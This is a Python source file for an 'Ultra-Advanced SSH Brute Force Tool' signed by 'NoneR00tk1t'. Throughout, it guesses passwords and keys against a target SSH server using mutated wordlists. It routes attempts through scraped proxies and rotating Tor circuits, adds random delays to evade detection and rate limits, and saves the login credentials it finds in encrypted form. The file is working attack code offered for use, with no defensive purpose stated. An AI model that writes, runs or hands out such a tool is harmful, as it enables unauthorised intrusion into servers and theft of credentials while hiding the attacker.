# $NoneR00tk1t$
# $28 Oc 2025$
import socket
import random
import colorama
from colorama import Fore, Back, Style
import json
import time
from typing import List, Optional, Tuple, Dict
from tqdm import tqdm
import socks
import re
import asyncio
import aiohttp
import asyncssh
import logging
import logging.handlers
import sys
from datetime import datetime
from dataclasses import dataclass, field
from pathlib import Path
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import os
import signal
import pickle
import aiofiles
import async_timeout
from cryptography.hazmat.primitives.asymmetric import rsa, dsa, ec
from cryptography.hazmat.primitives.serialization import Encoding, PrivateFormat, NoEncryption
import secrets
import yaml
from faker import Faker
import argparse

try:
    import aiohttp_socks
    import stem
    from stem.control import Controller
    import psutil
except ImportError as e:
    print(f"Missing required module: {e.name}. Please install it using 'pip install {e.name}'")
    sys.exit(1)

Path("logs").mkdir(exist_ok=True)

handlers = [
    logging.handlers.RotatingFileHandler(
        f'logs/ssh_bruteforce_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log',
        maxBytes=50 * 1024 * 1024,
        backupCount=10
    ),
    logging.StreamHandler(sys.stdout)
]

if os.path.exists('/dev/log'):
    handlers.append(logging.handlers.SysLogHandler(address='/dev/log'))

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - [%(threadName)s:%(processName)s:%(process)d] - %(message)s',
    handlers=handlers
)

logger = logging.getLogger(__name__)

@dataclass
class AttackStats:
    attempts: int = 0
    successful: int = 0
    failed: int = 0
    errors: int = 0
    start_time: float = field(default_factory=time.time)
    last_success: float = 0
    rate_per_second: float = 0
    proxy_success: int = 0
    proxy_failures: int = 0
    tor_success: int = 0
    tor_failures: int = 0
    resource_usage: Dict[str, float] = field(default_factory=lambda: {"cpu": 0.0, "mem": 0.0})

@dataclass
class ProxyInfo:
    host: str
    port: int
    latency: float
    last_used: float
    failures: int
    success_count: int
    type: str = 'socks5'
    username: Optional[str] = None
    password: Optional[str] = None

class CircuitBreaker:
    def __init__(self, max_failures: int, reset_timeout: int):
        self.max_failures = max_failures
        self.reset_timeout = reset_timeout
        self.failures = 0
        self.last_failure = 0
        self.state = "CLOSED"
        self.lock = asyncio.Lock()

    async def execute(self, coro):
        async with self.lock:
            if self.state == "OPEN":
                if time.time() - self.last_failure > self.reset_timeout:
                    self.state = "HALF_OPEN"
                    self.failures = 0
                else:
                    raise RuntimeError("Circuit breaker is open")
        
        try:
            result = await coro
            async with self.lock:
                if self.state == "HALF_OPEN":
                    self.state = "CLOSED"
                    self.failures = 0
            return result
        except Exception as e:
            async with self.lock:
                self.failures += 1
                if self.failures >= self.max_failures:
                    self.state = "OPEN"
                    self.last_failure = time.time()
            raise e

class SSHBruteForce:
    def __init__(self, hostname: str, port: int = 22, timeout: int = 5,
                 max_retries: int = 3, proxy_list: Optional[List[Tuple[str, int, str, Optional[str], Optional[str]]]] = None,
                 max_connections: int = 100, config: Dict = None):
        self.hostname = self._validate_hostname(hostname)
        self.port = self._validate_port(port)
        self.timeout = timeout
        self.max_retries = max_retries
        self.proxy_pool = [ProxyInfo(host, port, float('inf'), 0, 0, 0, ptype, user, pwd)
                           for host, port, ptype, user, pwd in (proxy_list or [])]
        self.current_proxy_idx = 0
        self.found_credentials = []
        self.lock = asyncio.Lock()
        self.stats = AttackStats()
        self.stop_flag = asyncio.Event()
        self.rate_limit_delay = 0.05
        self.max_delay = 60.0
        self.config = config or {}
        self.min_password_complexity = self.config.get('min_password_complexity', 8)
        
        key_file = Path("encryption_key.key")
        if key_file.exists():
            self.encryption_key = key_file.read_bytes()
        else:
            password = secrets.token_bytes(64)
            salt = secrets.token_bytes(16)
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
            )
            self.encryption_key = base64.urlsafe_b64encode(kdf.derive(password))
            key_file.write_bytes(self.encryption_key)
        
        self.cipher = Fernet(self.encryption_key)
        self.circuit_breaker = CircuitBreaker(max_failures=50, reset_timeout=1800)
        self.active_connections = 0
        self.session_cache = Path("session_cache_encrypted_v2.pkl")
        self.successful_proxies = set()
        self.proxy_health_check_interval = 120
        self.ssh_key_types = ['rsa', 'ecdsa', 'dsa', 'ed25519']
        self.max_key_attempts = self.config.get('max_key_attempts', 500)
        self.tor_controller = None
        self.use_tor = self.config.get('use_tor', False)
        self.tor_socks_port = self.config.get('tor_socks_port', 9050)
        self.resource_monitor_interval = 10
        self.fake = Faker()
        self.mutator_patterns = [
            lambda p: p + str(random.randint(100, 999)),
            lambda p: p.capitalize() + '!',
            lambda p: p.replace('a', '@').replace('i', '1'),
            lambda p: p + str(datetime.now().year),
            lambda p: 'P@ss' + p,
        ]
        if self.use_tor:
            self._init_tor()

    def _init_tor(self):
        try:
            if not os.path.exists("/var/run/tor/control"):
                logger.warning("Tor service not running")
                self.use_tor = False
                return
            self.tor_controller = Controller.from_port(port=9051)
            self.tor_controller.authenticate()
            logger.info("Tor controller initialized")
        except (ConnectionError, stem.InvalidArguments) as e:
            logger.warning(f"Failed to initialize Tor: {e}")
            self.use_tor = False
        except Exception as e:
            logger.error(f"Unexpected error in Tor initialization: {e}", exc_info=True)
            self.use_tor = False

    def _validate_hostname(self, hostname: str) -> str:
        try:
            socket.gethostbyname(hostname)
        except socket.gaierror:
            raise ValueError("Invalid hostname format")
        return hostname

    def _validate_port(self, port: int) -> int:
        if not 1 <= port <= 65535:
            raise ValueError("Port must be between 1 and 65535")
        return port

    def _validate_config(self):
        required_fields = {
            'max_threads': int,
            'delay': float,
            'timeout': int,
            'max_retries': int,
            'max_connections': int,
            'min_password_complexity': int,
            'max_key_attempts': int,
            'proxy_health_check_interval': int,
            'use_tor': bool,
            'tor_socks_port': int
        }
        for field, field_type in required_fields.items():
            try:
                if field in self.config:
                    self.config[field] = field_type(self.config[field])
                    if field != 'use_tor' and self.config[field] <= 0:
                        raise ValueError(f"{field} must be positive")
            except (ValueError, KeyError):
                logger.error(f"Invalid configuration for {field}")
                raise ValueError(f"Invalid configuration for {field}")

    async def _test_proxy(self, proxy: ProxyInfo) -> bool:
        start_time = time.time()
        try:
            connector = aiohttp_socks.ProxyConnector.from_url(
                f"{proxy.type}://{proxy.username}:{proxy.password}@{proxy.host}:{proxy.port}" if proxy.username else f"{proxy.type}://{proxy.host}:{proxy.port}"
            )
            async with aiohttp.ClientSession(connector=connector) as session:
                async with async_timeout.timeout(self.timeout):
                    async with session.get('http://httpbin.org/ip') as resp:
                        if resp.status == 200:
                            proxy.latency = time.time() - start_time
                            proxy.success_count += 1
                            proxy.last_used = time.time()
                            self.successful_proxies.add((proxy.host, proxy.port))
                            self.stats.proxy_success += 1
                            return True
        except Exception as e:
            proxy.failures += 1
            self.stats.proxy_failures += 1
            logger.debug(f"Proxy {proxy.host}:{proxy.port} ({proxy.type}) failed: {e}")
            return False

    async def _test_tor(self) -> bool:
        start_time = time.time()
        try:
            connector = aiohttp_socks.ProxyConnector.from_url(f"socks5://127.0.0.1:{self.tor_socks_port}")
            async with aiohttp.ClientSession(connector=connector) as session:
                async with async_timeout.timeout(self.timeout):
                    async with session.get('http://httpbin.org/ip') as resp:
                        if resp.status == 200:
                            self.stats.tor_success += 1
                            logger.debug(f"Tor connection successful, latency: {time.time() - start_time}")
                            return True
        except Exception as e:
            self.stats.tor_failures += 1
            logger.debug(f"Tor connection failed: {e}")
            return False

    async def _maintain_proxy_pool(self):
        while not self.stop_flag.is_set():
            tasks = [self._test_proxy(proxy) for proxy in self.proxy_pool]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            self.proxy_pool = [proxy for proxy, result in zip(self.proxy_pool, results)
                               if not isinstance(result, Exception) and proxy.failures < 3]
            if len(self.proxy_pool) < 10:
                await self._scrape_new_proxies()
            if self.use_tor:
                await self._test_tor()
                if self.tor_controller:
                    try:
                        self.tor_controller.signal('NEWCIRCUIT')
                    except:
                        pass
            await asyncio.sleep(self.proxy_health_check_interval)

    async def _scrape_new_proxies(self):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get('https://www.proxy-list.download/api/v1/get?type=socks5') as resp:
                    text = await resp.text()
                    matches = re.findall(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)', text)
                    new_proxies = [ProxyInfo(ip, int(port), float('inf'), 0, 0, 0, 'socks5') for ip, port in matches[:20]]
                    self.proxy_pool.extend(new_proxies)
                    logger.info(f"Scraped {len(new_proxies)} new proxies")
        except Exception as e:
            logger.warning(f"Failed to scrape proxies: {e}")

    async def test_connection(self) -> bool:
        for attempt in range(self.max_retries):
            proxy_cmd = await self._get_proxy_command()
            try:
                async with asyncssh.connect(
                    self.hostname, self.port, known_hosts=None,
                    connect_timeout=self.timeout, proxy_command=proxy_cmd
                ):
                    logger.info(f"Connection test successful to {self.hostname}:{self.port}")
                    return True
            except Exception as e:
                logger.warning(f"Connection attempt {attempt + 1}/{self.max_retries} failed: {e}")
                await asyncio.sleep(min(2 ** attempt + random.uniform(0, 0.5), self.max_delay))
        logger.error(f"Unable to connect to {self.hostname}:{self.port} after {self.max_retries} attempts")
        return False

    async def _get_proxy_command(self) -> Optional[str]:
        if self.use_tor and random.random() < 0.5:
            if self.tor_controller and random.random() < 0.1:
                try: self.tor_controller.signal('NEWCIRCUIT')
                except: pass
            return f"nc -X 5 -x 127.0.0.1:{self.tor_socks_port} %h %p"
        if self.proxy_pool:
            valid = [p for p in self.proxy_pool if p.failures < 3 and p.success_count > 0]
            if valid:
                p = random.choices(valid, weights=[1/(p.latency+0.01) for p in valid])[0]
                return f"nc -X 5 -x {p.host}:{p.port} %h %p"
        return None

    def _rotate_proxy(self):
        self.current_proxy_idx = (self.current_proxy_idx + 1) % max(1, len(self.proxy_pool))
        if self.use_tor and self.tor_controller:
            try:
                self.tor_controller.signal('NEWCIRCUIT')
            except Exception as e:
                logger.warning(f"Failed to signal NEWCIRCUIT: {e}")

    def _encrypt_credential(self, username: str, password: str, auth_type: str = "password") -> str:
        credential = f"{username}:{password}:{auth_type}:{datetime.now().isoformat()}:{self.fake.user_agent()}"
        return self.cipher.encrypt(credential.encode()).decode()

    async def _save_session(self):
        try:
            async with aiofiles.open(self.session_cache, 'wb') as f:
                session_data = {
                    'found_credentials': self.found_credentials,
                    'stats': vars(self.stats),
                    'current_proxy_idx': self.current_proxy_idx,
                    'proxy_pool': [(p.host, p.port, p.latency, p.last_used, p.failures, p.success_count, p.type, p.username, p.password)
                                  for p in self.proxy_pool]
                }
                encrypted = self.cipher.encrypt(pickle.dumps(session_data))
                await f.write(encrypted)
        except Exception as e:
            logger.error(f"Failed to save session: {e}")

    async def _load_session(self):
        if self.session_cache.exists():
            try:
                async with aiofiles.open(self.session_cache, 'rb') as f:
                    encrypted_data = await f.read()
                    session_data = pickle.loads(self.cipher.decrypt(encrypted_data))
                    self.found_credentials = session_data.get('found_credentials', [])
                    self.current_proxy_idx = session_data.get('current_proxy_idx', 0)
                    for key, value in session_data.get('stats', {}).items():
                        setattr(self.stats, key, value)
                    self.proxy_pool = [ProxyInfo(*p[:2], *p[2:6], p[6], p[7] if len(p) > 7 else None, p[8] if len(p) > 8 else None)
                                      for p in session_data.get('proxy_pool', [])]
                logger.info("Loaded encrypted session state v2")
            except Exception as e:
                logger.error(f"Failed to load session: {e}")

    async def _generate_ssh_key(self, key_type: str) -> Optional[bytes]:
        try:
            if key_type == 'rsa':
                key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
            elif key_type == 'ecdsa':
                key = ec.generate_private_key(curve=ec.SECP256R1())
            elif key_type == 'dsa':
                key = dsa.generate_private_key(key_size=1024)
            elif key_type == 'ed25519':
                from cryptography.hazmat.primitives.asymmetric import ed25519
                key = ed25519.Ed25519PrivateKey.generate()
            else:
                raise ValueError(f"Unsupported key type: {key_type}")
            
            return key.private_bytes(
                encoding=Encoding.PEM,
                format=PrivateFormat.PKCS8,
                encryption_algorithm=NoEncryption()
            )
        except Exception as e:
            logger.error(f"Failed to generate SSH key ({key_type}): {e}")
            return None

    async def _monitor_resources(self):
        while not self.stop_flag.is_set():
            try:
                cpu = psutil.cpu_percent()
                mem = psutil.virtual_memory().percent
                self.stats.resource_usage = {"cpu": cpu, "mem": mem}
                if cpu > 90 or mem > 90:
                    logger.warning(f"High resource usage: CPU {cpu}%, Mem {mem}% - Pausing")
                    await asyncio.sleep(60)
                await asyncio.sleep(self.resource_monitor_interval)
            except Exception as e:
                logger.error(f"Error monitoring resources: {e}", exc_info=True)
                await asyncio.sleep(self.resource_monitor_interval)

    async def ssh_connect(self, username: str, password: Optional[str] = None,
                          private_key: Optional[bytes] = None) -> bool:
        temp_key_file = None
        try:
            self.active_connections += 1
            
            proxy_cmd = await self._get_proxy_command()
            connect_kwargs = {
                'host': self.hostname,
                'port': self.port,
                'username': username,
                'connect_timeout': self.timeout,
                'known_hosts': None,
                'proxy_command': proxy_cmd
            }
            
            if password:
                connect_kwargs['password'] = password
            elif private_key:
                temp_key_file = Path(f"temp_key_{secrets.token_hex(8)}")
                temp_key_file.write_bytes(private_key)
                connect_kwargs['client_keys'] = [str(temp_key_file)]
            
            try:
                async with self.circuit_breaker.execute(asyncssh.connect(**connect_kwargs)) as conn:
                    result = await conn.run('whoami', check=True)
                    if username in result.stdout:
                        auth_type = "password" if password else "key"
                        encrypted_cred = self._encrypt_credential(username, password or "SSH_KEY", auth_type)
                        self.found_credentials.append(encrypted_cred)
                        self.stats.successful += 1
                        self.stats.last_success = time.time()
                        logger.info(f"SUCCESS! {username}:[REDACTED] ({auth_type}) - Output: {result.stdout.strip()}")
                        await self._save_session()
                        return True
            except asyncssh.misc.PermissionDenied:
                self.stats.failed += 1
                return False
            except Exception as e:
                logger.warning(f"Connection error for {username}:[REDACTED]: {str(e)}")
                self.stats.errors += 1
                self._rotate_proxy()
                return False
        finally:
            self.active_connections -= 1
            if temp_key_file and temp_key_file.exists():
                try:
                    temp_key_file.unlink()
                except:
                    pass

    def _mutate_password(self, password: str) -> List[str]:
        mutants = [password]
        for mutator in self.mutator_patterns:
            try:
                mutants.append(mutator(password))
            except Exception as e:
                logger.debug(f"Password mutation failed for {password}: {e}")
        return list(set(mutants))

    def _calculate_adaptive_delay(self, delay: float) -> float:
        if self.stats.attempts == 0:
            return delay
            
        error_rate = self.stats.errors / max(1, self.stats.attempts)
        success_rate = self.stats.successful / max(1, self.stats.attempts)
        active_proxy_count = len(self.successful_proxies) + (1 if self.use_tor else 0)
        base_delay = delay * (1 / max(0.1, active_proxy_count))
        
        if error_rate > 0.2:
            return min(base_delay * 3, self.max_delay)
        elif success_rate > 0.01:
            return max(base_delay * 1.5, 0.1)
        return max(base_delay / 1.5, 0.01)

    async def brute_force_single_user(self, username: str, password_list: List[str],
                                      max_threads: int = 20, delay: float = 0.05) -> bool:
        if not await self.test_connection():
            return False

        await self._load_session()
        
        async def worker(credential):
            if self.stop_flag.is_set():
                return False
            
            self.stats.attempts += 1
            self.stats.rate_per_second = self.stats.attempts / (time.time() - self.stats.start_time)

            while self.active_connections >= max_threads:
                await asyncio.sleep(0.05)
            
            if isinstance(credential, str):
                result = await self.ssh_connect(username, password=credential)
            else:
                result = await self.ssh_connect(username, private_key=credential)
                
            adaptive_delay = self._calculate_adaptive_delay(delay)
            await asyncio.sleep(adaptive_delay + random.uniform(0, 0.2))
            return result

        mutated_passwords = []
        for pw in password_list:
            mutated_passwords.extend(self._mutate_password(pw))
        credentials = list(set(mutated_passwords))

        key_tasks = []
        for key_type in self.ssh_key_types:
            for _ in range(self.max_key_attempts // len(self.ssh_key_types)):
                key_tasks.append(self._generate_ssh_key(key_type))
        keys = await asyncio.gather(*key_tasks)
        credentials.extend([k for k in keys if k is not None])

        random.shuffle(credentials)
        tasks = [worker(cred) for cred in credentials]
        
        asyncio.create_task(self._monitor_resources())

        with tqdm(total=len(credentials), desc=f"Trying credentials for {username}",
                  unit="attempt") as pbar:
            for i in range(0, len(tasks), max_threads):
                batch = tasks[i:i+max_threads]
                results = await asyncio.gather(*batch, return_exceptions=True)
                for result in results:
                    if isinstance(result, Exception):
                        logger.error(f"Error in worker: {result}")
                    pbar.update(1)
                    pbar.set_postfix({
                        "rate": f"{self.stats.rate_per_second:.2f}/s", 
                        "res": f"CPU:{self.stats.resource_usage.get('cpu', 0):.1f}%"
                    })
                    if self.stop_flag.is_set():
                        break
                if self.stop_flag.is_set():
                    break

        return len(self.found_credentials) > 0

    async def brute_force_multi_user(self, user_list: List[str], password_list: List[str],
                                     max_threads: int = 50, delay: float = 0.1) -> bool:
        if not await self.test_connection():
            return False

        await self._load_session()
        
        async def worker(args):
            username, credential = args
            if self.stop_flag.is_set():
                return False
            
            self.stats.attempts += 1
            self.stats.rate_per_second = self.stats.attempts / (time.time() - self.stats.start_time)

            while self.active_connections >= max_threads:
                await asyncio.sleep(0.05)
                
            if isinstance(credential, str):
                result = await self.ssh_connect(username, password=credential)
            else:
                result = await self.ssh_connect(username, private_key=credential)
                
            adaptive_delay = self._calculate_adaptive_delay(delay)
            await asyncio.sleep(adaptive_delay + random.uniform(0, 0.3))
            return result

        mutated_passwords = []
        for pw in password_list:
            mutated_passwords.extend(self._mutate_password(pw))
        credentials = list(set(mutated_passwords))

        key_tasks = []
        for key_type in self.ssh_key_types:
            for _ in range(self.max_key_attempts // len(self.ssh_key_types)):
                key_tasks.append(self._generate_ssh_key(key_type))
        keys = await asyncio.gather(*key_tasks)
        credentials.extend([k for k in keys if k is not None])
                
        combinations = [(u, c) for u in user_list for c in credentials]
        random.shuffle(combinations)
        tasks = [worker(combo) for combo in combinations]
        
        if self.proxy_pool or self.use_tor:
            asyncio.create_task(self._maintain_proxy_pool())
            
        asyncio.create_task(self._monitor_resources())

        with tqdm(total=len(combinations), desc="Trying credentials",
                  unit="attempt") as pbar:
            batch_size = max_threads
            for i in range(0, len(tasks), batch_size):
                batch = tasks[i:i+batch_size]
                results = await asyncio.gather(*batch, return_exceptions=True)
                for result in results:
                    if isinstance(result, Exception):
                        logger.error(f"Error in worker: {result}")
                    pbar.update(1)
                    pbar.set_postfix({
                        "rate": f"{self.stats.rate_per_second:.2f}/s", 
                        "res": f"CPU:{self.stats.resource_usage.get('cpu', 0):.1f}%"
                    })
                    if self.stop_flag.is_set():
                        return len(self.found_credentials) > 0
                if self.stop_flag.is_set():
                    break

        return len(self.found_credentials) > 0

    async def export_results(self, output_file: str, format: str = 'json'):
        results = {
            'timestamp': datetime.now().isoformat(),
            'target': f"{self.hostname}:{self.port}",
            'stats': {
                'attempts': self.stats.attempts,
                'successful': self.stats.successful,
                'failed': self.stats.failed,
                'errors': self.stats.errors,
                'duration': time.time() - self.stats.start_time,
                'avg_rate_per_second': self.stats.rate_per_second,
                'proxy_success': self.stats.proxy_success,
                'proxy_failures': self.stats.proxy_failures,
                'tor_success': self.stats.tor_success,
                'tor_failures': self.stats.tor_failures,
                'resource_usage': self.stats.resource_usage,
                'successful_proxies': list(self.successful_proxies)
            },
            'credentials': []
        }
        for cred in self.found_credentials:
            try:
                decrypted = self.cipher.decrypt(cred.encode()).decode()
                parts = decrypted.split(':')
                results['credentials'].append({
                    'username': parts[0],
                    'credential': '[REDACTED]',
                    'auth_type': parts[2],
                    'timestamp': parts[3],
                    'ua': parts[4]
                })
            except Exception as e:
                logger.error(f"Error decrypting credential: {e}")
        
        async with aiofiles.open(output_file, 'w') as f:
            if format == 'json':
                await f.write(json.dumps(results, indent=4))
            elif format == 'yaml':
                await f.write(yaml.safe_dump(results, indent=2))
            else:
                await f.write(str(results))
        logger.info(f"Results exported to {output_file} in {format}")

def is_strong_password(password: str) -> bool:
    if len(password) < 8:
        return False
    has_upper = re.search(r"[A-Z]", password) is not None
    has_lower = re.search(r"[a-z]", password) is not None
    has_digit = re.search(r"[0-9]", password) is not None
    has_special = re.search(r"[!@#$%^&*(),.?\":{}|<>]", password) is not None
    return any([has_upper, has_lower, has_digit, has_special])

def load_wordlist(file_path: str) -> List[str]:
    cache_file = Path(f"{file_path}.cache_v2")
    if cache_file.exists():
        try:
            with open(cache_file, 'rb') as f:
                return pickle.load(f)
        except:
            pass

    try:
        path = Path(file_path)
        if not path.exists():
            logger.error(f"Wordlist file not found: {file_path}")
            return []
        wordlist = [line.strip() for line in path.read_text(encoding='utf-8', errors='ignore').splitlines()
                    if line.strip()]
        extended = []
        for w in wordlist[:1000]:
            extended.extend([mut(w) for mut in [lambda p: p, lambda p: p + '123', lambda p: p + '!', lambda p: p.capitalize()]])
        wordlist.extend(list(set(extended) - set(wordlist)))
        with open(cache_file, 'wb') as f:
            pickle.dump(wordlist, f)
        return wordlist
    except Exception as e:
        logger.error(f"Error loading wordlist: {e}")
        return []

def load_proxy_list(file_path: str) -> List[Tuple[str, int, str, Optional[str], Optional[str]]]:
    try:
        path = Path(file_path)
        if not path.exists():
            logger.error(f"Proxy list file not found: {file_path}")
            return []
        proxies = []
        with path.open('r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                parts = line.strip().split(':')
                if len(parts) >= 2:
                    host, port = parts[:2]
                    ptype = parts[2] if len(parts) > 2 else 'socks5'
                    user = parts[3] if len(parts) > 3 else None
                    pwd = parts[4] if len(parts) > 4 else None
                    proxies.append((host, int(port), ptype, user, pwd))
        return proxies
    except Exception as e:
        logger.error(f"Error loading proxy list: {e}")
        return []

def load_config(config_file: str = "bruteforce_config.yaml"):
    try:
        with open(config_file, 'r') as f:
            config = yaml.safe_load(f) or {}
    except Exception as e:
        logger.warning(f"Error reading config file: {e}, using defaults")
        config = {}
    
    defaults = {
        'max_threads': 50,
        'delay': 0.1,
        'timeout': 10,
        'max_retries': 5,
        'max_connections': 200,
        'proxy_list': '',
        'default_wordlist': 'Password-list.txt',
        'output_file': 'bruteforce_results.yaml',
        'log_level': 'INFO',
        'min_password_complexity': 10,
        'max_key_attempts': 1000,
        'proxy_health_check_interval': 60,
        'use_tor': False,
        'tor_socks_port': 9050,
        'output_format': 'yaml'
    }
    config = {**defaults, **config}
    
    logging.getLogger().setLevel(config['log_level'])
    return config

def handle_shutdown(brute_force: SSHBruteForce):
    async def shutdown():
        logger.info("Received shutdown signal, saving state...")
        brute_force.stop_flag.set()
        await brute_force.export_results('bruteforce_results_shutdown.yaml', format='yaml')
        if brute_force.tor_controller:
            brute_force.tor_controller.close()
        sys.exit(0)
    
    def signal_handler(sig, frame):
        asyncio.create_task(shutdown())
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

async def main():
    config = load_config()
    
    parser = argparse.ArgumentParser(description="Ultra-Advanced SSH Brute Force Tool with Evasion and Distribution")
    parser.add_argument("host", help="Target hostname or IP address")
    parser.add_argument("-p", "--port", type=int, default=22, help="SSH port")
    parser.add_argument("-u", "--user", help="Single username to test")
    parser.add_argument("-U", "--userlist", help="File containing list of usernames")
    parser.add_argument("-P", "--password", help="Single password to test")
    parser.add_argument("-W", "--wordlist", default=config['default_wordlist'],
                        help=f"File containing list of passwords (default: {config['default_wordlist']})")
    parser.add_argument("-t", "--threads", type=int, default=config['max_threads'],
                        help=f"Number of threads (default: {config['max_threads']})")
    parser.add_argument("-d", "--delay", type=float, default=config['delay'],
                        help=f"Delay between attempts (default: {config['delay']}s)")
    parser.add_argument("-T", "--timeout", type=int, default=config['timeout'],
                        help=f"Connection timeout (default: {config['timeout']}s)")
    parser.add_argument("-r", "--retries", type=int, default=config['max_retries'],
                        help=f"Maximum retries (default: {config['max_retries']})")
    parser.add_argument("-c", "--connections", type=int, default=config['max_connections'],
                        help=f"Maximum concurrent connections (default: {config['max_connections']})")
    parser.add_argument("--proxy-list", help="File containing list of proxies (host:port:type:user:pass)")
    parser.add_argument("--enable-keys", action="store_true",
                        help="Enable SSH key-based authentication attempts")
    parser.add_argument("--use-tor", action="store_true", help="Enable Tor for anonymity")
    
    args = parser.parse_args()
    
    config['use_tor'] = args.use_tor or config['use_tor']
    
    proxy_list = []
    if args.proxy_list:
        proxy_list = load_proxy_list(args.proxy_list)
        
    brute_force = SSHBruteForce(
        args.host,
        args.port,
        args.timeout,
        args.retries,
        proxy_list,
        args.connections,
        config
    )
    
    try:
        brute_force._validate_config()
    except:
        pass
    
    if proxy_list:
        tasks = [brute_force._test_proxy(proxy) for proxy in brute_force.proxy_pool]
        await asyncio.gather(*tasks)
        logger.info(f"Validated {len(brute_force.successful_proxies)}/{len(proxy_list)} proxies")

    if args.user:
        users = [args.user]
    elif args.userlist:
        users = load_wordlist(args.userlist)
    else:
        logger.error("Please specify a username or userlist")
        return
    
    if args.password:
        passwords = [args.password]
    elif args.wordlist:
        passwords = load_wordlist(args.wordlist)
    else:
        logger.error("No passwords specified")
        return
    
    if not users or (not passwords and not args.enable_keys):
        logger.error("No users or credentials to test")
        return
    
    handle_shutdown(brute_force)
    
    logger.info(f"Starting advanced SSH brute force on {args.host}:{args.port} with evasion")
    logger.info(f"Users: {len(users)}, Passwords: {len(passwords)} (mutated: ~{len(passwords)*len(brute_force.mutator_patterns)})")
    total_keys = brute_force.max_key_attempts if args.enable_keys else 0
    logger.info(f"Total combinations: {len(users) * (len(passwords) + total_keys)}")
    if proxy_list:
        logger.info(f"Using {len(proxy_list)} proxies ({len(brute_force.successful_proxies)} validated)")
    if config['use_tor']:
        logger.info(f"Tor enabled on port {brute_force.tor_socks_port}")
    
    try:
        if len(users) == 1:
            success = await brute_force.brute_force_single_user(
                users[0], passwords, args.threads, args.delay
            )
        else:
            success = await brute_force.brute_force_multi_user(
                users, passwords, args.threads, args.delay
            )
        
        await brute_force.export_results(config['output_file'], config['output_format'])
        
        logger.info("\n" + "="*100)
        logger.info("ATTACK SUMMARY")
        logger.info("="*100)
        logger.info(f"Time elapsed: {time.time() - brute_force.stats.start_time:.2f} seconds")
        logger.info(f"Total attempts: {brute_force.stats.attempts}")
        logger.info(f"Successful logins: {brute_force.stats.successful}")
        logger.info(f"Failed attempts: {brute_force.stats.failed}")
        logger.info(f"Errors: {brute_force.stats.errors}")
        logger.info(f"Proxy success/failures: {brute_force.stats.proxy_success}/{brute_force.stats.proxy_failures}")
        logger.info(f"Tor success/failures: {brute_force.stats.tor_success}/{brute_force.stats.tor_failures}")
        logger.info(f"Average rate: {brute_force.stats.rate_per_second:.2f} attempts/second")
        logger.info(f"Resource usage: CPU {brute_force.stats.resource_usage.get('cpu', 0)}%, Mem {brute_force.stats.resource_usage.get('mem', 0)}%")

        if brute_force.found_credentials:
            logger.info("\nCREDENTIALS FOUND:")
            for cred in brute_force.found_credentials:
                try:
                    decrypted = brute_force.cipher.decrypt(cred.encode()).decode()
                    username, password, auth_type, ts, ua = decrypted.split(':')
                    display_password = '[SSH_KEY]' if auth_type == 'key' else '[REDACTED]'
                    logger.info(f"  {username}:{display_password} ({auth_type}) at {ts} UA: {ua}")
                except Exception as e:
                    logger.error(f"Error decrypting credential: {e}")
            
    except KeyboardInterrupt:
        logger.info("Attack interrupted by user")
        brute_force.stop_flag.set()
        await brute_force.export_results(config['output_file'], config['output_format'])
    except Exception as e:
        logger.error(f"Critical error: {e}", exc_info=True)
        await brute_force.export_results(config['output_file'], config['output_format'])
    finally:
        await brute_force._save_session()
        if brute_force.tor_controller:
            brute_force.tor_controller.close()

colorama.init(autoreset=True)
def print_banner():
    print(f"""
{Fore.RED}[x] {Fore.WHITE}OPERATOR: {Fore.LIGHTBLACK_EX}[NoneR00tk1t]
{Fore.RED}[x] {Fore.WHITE}TEAM: {Fore.LIGHTBLACK_EX}[Valhala]
{Fore.LIGHTBLACK_EX}-------------------------------------
{Fore.RED}  ****           *   *
{Fore.RED} *  *************  **
{Fore.RED}*     *********    **
{Fore.RED}*     *  *         **
{Fore.RED} **  *  **         **
{Fore.RED}    *  ***         **  ***
{Fore.RED}   **   **         ** * ***
{Fore.RED}   **   **         ***   *
{Fore.RED}   **   **         **   *
{Fore.RED}   **   **         **  *
{Fore.RED}    **  **         ** **
{Fore.RED}     ** *      *   ******
{Fore.RED}      ***     *    **  ***
{Fore.RED}       *******     **   *** *
{Fore.RED}         ***        **   ***
{Fore.LIGHTBLACK_EX}-------------------------------------
{Style.RESET_ALL}
    """)

if __name__ == "__main__":
    print_banner()
    asyncio.run(main())
